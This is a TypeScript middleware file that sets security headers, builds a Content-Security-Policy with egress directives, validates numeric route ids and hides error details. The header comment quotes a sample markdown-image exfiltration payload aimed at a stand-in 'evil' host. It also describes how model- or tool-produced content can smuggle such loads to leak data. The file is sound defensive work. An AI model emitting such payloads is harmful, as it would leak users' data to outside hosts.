// HTTP response hardening: security headers on every response, numeric id
// validation for route params, and the app's final error handler.
//
// Why each piece:
// - nosniff: a user-generated artifact (export, image) is never re-interpreted
//   by the browser as HTML/script.
// - Referrer-Policy same-origin: chat/deck URLs (ids) never leak to the external
//   sites a user opens from a message or an MCP login link.
// - X-Frame-Options SAMEORIGIN + CSP frame-ancestors 'self': another site can't
//   frame the app to click-jack an admin action.
// - CSP base-uri/object-src/form-action: an injected <base>, plugin <object> or
//   <form action=evil> can't redirect scripts, run plugins or post data away.
//   The enforced CSP (D42, md-exfil) adds the egress directives: img-src,
//   font-src, style-src, media-src, connect-src and frame-src. They are the
//   browser-side backstop against data exfiltration through a remote image,
//   font, stylesheet or fetch that model- or tool-produced content smuggles in
//   (`![x](https://evil/?d=<data>)` loads with no click). srcdoc iframes INHERIT
//   the page policy, so one header covers chat, documents, the DS README, deck
//   slides, the export frame and the print window, streaming and old messages
//   alike. script-src stays open on purpose: the slide editor runtime and the
//   imported design-system scripts are inline (deck scripts are the sanitizer's
//   job). Remote origins a customer's design system really needs are allowed
//   by an admin (app_settings.external_asset_origins, read through
//   server/egressSetting.ts, never awaited here) or by EXTERNAL_ASSET_ORIGINS;
//   they open img-src, font-src and style-src only, never connect-src,
//   media-src or frame-src (those would be fetch/navigation channels).
//   CSP_EGRESS=report (app.yaml, redeploy the same build) is the way back: the
//   egress directives leave this header and only the Report-Only policy
//   (server/middleware/security.ts, which already carries them) watches.
// - numeric ids: every :id/:messageId route reads a BIGINT key. A malformed id
//   used to reach Postgres and come back as a 500 with the raw driver message
//   ("invalid input syntax for type bigint"). Now the route is skipped and the
//   request ends in the usual 404.
// - final error handler: errors no route caught (malformed JSON, oversized
//   bodies, upload limits, anything thrown) answer with a generic JSON body; the
//   detail goes to the server log only. Express's default page carries the stack
//   trace whenever NODE_ENV isn't "production".
import { logger } from './log.ts'
import { EMPTY_EGRESS_POLICY, parseAllowedOrigins } from '../shared/urlEgressPolicy.js'
import type { EgressPolicy } from '../shared/urlEgressPolicy.js'
import { currentExternalAssetOrigins } from './egressSetting.ts'

export type CspEgressMode = 'enforce' | 'report'

const BASE_DIRECTIVES = ["frame-ancestors 'self'", "base-uri 'self'", "object-src 'none'", "form-action 'self'"]
// where blocked loads of the enforced policy are reported (the same PII-free csp_violation path the Report-Only header uses)
const REPORT_DIRECTIVES = ['report-uri /api/csp-report', 'report-to csp-endpoint']

/** The six egress directives. Allowed origins open img-src, font-src and style-src only. */
export function egressDirectives(policy: EgressPolicy): string[] {
  const o = policy.allowedOrigins.map((a) => a.origin)
  const withOrigins = (base: string) => [base, ...o].join(' ')
  return [
    `img-src ${withOrigins("'self' data: blob:")}`,
    `font-src ${withOrigins("'self' data:")}`,
    `style-src ${withOrigins("'self' 'unsafe-inline'")}`,
    "media-src 'self' data: blob:",
    "connect-src 'self'",
    "frame-src 'self' blob:",
  ]
}

/** Pure: the Content-Security-Policy header value for a mode and a policy. */
export function buildContentSecurityPolicy(opts: { mode: CspEgressMode; policy: EgressPolicy }): string {
  if (opts.mode === 'report') return BASE_DIRECTIVES.join('; ')
  return [...BASE_DIRECTIVES, ...egressDirectives(opts.policy), ...REPORT_DIRECTIVES].join('; ')
}

type Env = Record<string, string | undefined>

/** CSP_EGRESS: only an explicit "report" turns the egress directives off; anything else (unset, typos) is enforce. */
export function egressModeOf(env: Env): CspEgressMode {
  return String(env.CSP_EGRESS ?? '').trim().toLowerCase() === 'report' ? 'report' : 'enforce'
}

/** EXTERNAL_ASSET_ORIGINS ∪ `origins`, every entry validated (invalid ones are dropped, never emitted), deduped. */
export function egressPolicyOf(env: Env, origins: readonly string[] = []): EgressPolicy {
  const hosts = { appHost: env.DATABRICKS_APP_URL, workspaceHost: env.DATABRICKS_HOST }
  const floor = parseAllowedOrigins(env.EXTERNAL_ASSET_ORIGINS, hosts).allowed
  const extra = parseAllowedOrigins(origins, hosts).allowed
  const seen = new Set<string>()
  const allowedOrigins = [...floor, ...extra].filter((a) => !seen.has(a.origin) && !!seen.add(a.origin))
  return allowedOrigins.length ? { allowedOrigins } : EMPTY_EGRESS_POLICY
}

/** env → mode; `origins` = the admin list (the env floor is added here). Pure. */
export function buildEnforcedCsp(env: Env, origins: readonly string[] = []): string {
  return buildContentSecurityPolicy({ mode: egressModeOf(env), policy: egressPolicyOf(env, origins) })
}

export const CONTENT_SECURITY_POLICY = buildContentSecurityPolicy({ mode: 'enforce', policy: EMPTY_EGRESS_POLICY })

// the slice of the Express request/response these middlewares touch
interface HdrRes {
  setHeader(name: string, value: string): unknown
}
interface ErrReq {
  method?: string
  originalUrl?: string
  url?: string
}
interface ErrRes {
  headersSent?: boolean
  status(code: number): { json(body: unknown): unknown }
}

/**
 * The default source: the cached admin list. Only a request that carries the platform's identity header may start the
 * background refresh, so anonymous traffic (and a boot with no signed-in user) never drives a database read.
 */
function originsForRequest(req?: unknown): readonly string[] {
  const h = (req as { headers?: Record<string, unknown> } | undefined)?.headers
  const signedIn = !!h && (typeof h['x-forwarded-access-token'] === 'string' || typeof h['x-forwarded-email'] === 'string' || typeof h['x-forwarded-preferred-username'] === 'string')
  return currentExternalAssetOrigins({ kick: signedIn })
}

/**
 * The env is read ONCE, here. `origins` (default: the admin setting, server/egressSetting.ts) is called synchronously on
 * every response: it must never wait for the database. The header string is memoized per distinct origins list.
 */
export function securityHeaders({ env = process.env, origins = originsForRequest }: { env?: Env; origins?: (req?: unknown) => readonly string[] } = {}) {
  const frozen: Env = { ...env }
  let lastKey = ''
  let lastCsp = buildEnforcedCsp(frozen, [])
  return function securityHeadersMiddleware(req: unknown, res: HdrRes, next: () => void) {
    let list: readonly string[] = []
    try {
      list = origins(req)
    } catch {
      // a broken source is "no extra origins" (stricter), never a failed response
    }
    const key = list.join(' ')
    if (key !== lastKey) {
      lastKey = key
      lastCsp = buildEnforcedCsp(frozen, list)
    }
    res.setHeader('X-Content-Type-Options', 'nosniff')
    res.setHeader('Referrer-Policy', 'same-origin')
    res.setHeader('X-Frame-Options', 'SAMEORIGIN')
    res.setHeader('Content-Security-Policy', lastCsp)
    next()
  }
}

const NUMERIC_ID = /^\d{1,18}$/

/** app.param callback: a non-numeric id skips the route, as if it never matched. */
export function numericIdParam(_req: unknown, _res: unknown, next: (arg?: 'route') => void, value: unknown) {
  if (NUMERIC_ID.test(String(value))) return next()
  next('route')
}

const MESSAGES: Record<number, { error: string; code: string }> = {
  400: { error: 'Requisição inválida.', code: 'bad_request' },
  411: { error: 'O corpo JSON precisa declarar o tamanho (Content-Length).', code: 'length_required' },
  413: { error: 'Arquivo ou corpo da requisição grande demais.', code: 'payload_too_large' },
  503: { error: 'Serviço temporariamente indisponível.', code: 'service_unavailable' },
  500: { error: 'Erro interno do servidor.', code: 'internal_error' },
}

interface ErrLike {
  name?: string
  code?: string
  status?: unknown
  statusCode?: unknown
  message?: string
}

function statusOf(e: unknown): number {
  const err = e as ErrLike | null | undefined // anything can be thrown; every read is optional-chained
  if (err?.name === 'MulterError') return err.code === 'LIMIT_FILE_SIZE' ? 413 : 400
  const s = Number(err?.status || err?.statusCode)
  if (s === 413 || s === 411 || s === 503) return s
  if (s >= 400 && s < 500) return 400
  return 500
}

export function finalErrorHandler({ log = (msg: string) => logger.error(msg) }: { log?: (msg: string) => unknown } = {}) {
  // eslint-disable-next-line no-unused-vars
  return function finalErrorHandlerMiddleware(err: unknown, req: ErrReq, res: ErrRes, next: (err?: unknown) => void) {
    // a streaming (SSE) response already started: only Express can end it
    if (res.headersSent) return next(err)
    const status = statusOf(err)
    log(`unhandled error on ${req.method || '?'} ${String(req.originalUrl || req.url || '?').split('?')[0]} -> ${status}: ${(err as ErrLike | null | undefined)?.message || err}`)
    res.status(status).json(MESSAGES[status])
  }
}
